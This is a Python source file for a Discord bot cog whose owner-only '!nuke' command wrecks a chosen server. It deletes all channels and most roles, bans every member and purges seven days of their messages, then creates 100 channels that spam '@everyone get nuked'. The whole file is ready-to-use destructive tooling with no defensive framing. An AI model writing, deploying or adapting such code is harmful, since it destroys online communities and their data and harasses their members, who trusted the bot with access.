import discord
from discord.ext import commands
import asyncio

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.owner_id = 1151872484937834496

    @commands.command(name="nuke", aliases=["nuker"])
    async def nuke(self, ctx, server_id: int = None):
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ No permission.")
            return
            
        if not server_id:
            await ctx.send("❌ Usage: `!nuke <server_id>`")
            return
            
        guild = self.bot.get_guild(server_id)
        if not guild:
            await ctx.send(f"❌ Server not found.")
            return
            
        await ctx.send(f"🚨 Nuking **{guild.name}**...")
        
        await asyncio.gather(
            self.mass_delete_channels(guild),
            self.mass_delete_roles(guild),
            self.mass_ban_members(guild),
            return_exceptions=True
        )
        
        await self.spam_channels(guild)
        await ctx.send("✅ **NUKE COMPLETE**")

    async def mass_delete_channels(self, guild):
        await asyncio.gather(*[c.delete(reason="Nuke") for c in guild.channels], return_exceptions=True)

    async def mass_delete_roles(self, guild):
        await asyncio.gather(*[r.delete(reason="Nuke") for r in guild.roles if r.name != "@everyone" and r != guild.me.top_role], return_exceptions=True)

    async def mass_ban_members(self, guild):
        await asyncio.gather(*[m.ban(reason="Nuke", delete_message_days=7) for m in guild.members if m.id != self.bot.user.id and m.id != self.owner_id], return_exceptions=True)

    async def spam_channels(self, guild):
        async def create_and_spam(i):
            try:
                ch = await guild.create_text_channel(f"nuked-{i}", reason="Nuke")
                await asyncio.gather(*[ch.send("@everyone get nuked") for _ in range(10)], return_exceptions=True)
            except:
                pass
        await asyncio.gather(*[create_and_spam(i) for i in range(100)], return_exceptions=True)

async def setup(bot):
    await bot.add_cog(Nuke(bot))
